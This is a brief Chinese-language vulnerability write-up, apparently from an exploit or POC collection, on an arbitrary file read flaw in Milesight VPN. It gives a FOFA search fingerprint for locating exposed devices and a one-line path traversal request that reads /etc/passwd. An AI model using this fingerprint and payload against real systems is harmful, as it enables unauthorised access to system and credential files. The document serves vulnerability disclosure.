# Milesight VPN 任意文件读取

## 漏洞描述

MilesightVPN参数未过滤照成任意文件读取

## 漏洞影响

```
All
```

## FOFA

```
fid="gJ5RnYgT0ivplZX18LR7VQ=="
```

## 漏洞复现

登陆页面

![image-20230814204908346](img/image-20230814204908346.png)

验证POC

```
GET /../../../etc/passwd
```

![image-20230814205020304](img/image-20230814205020304.png)

## Python poc

```
暂无
```
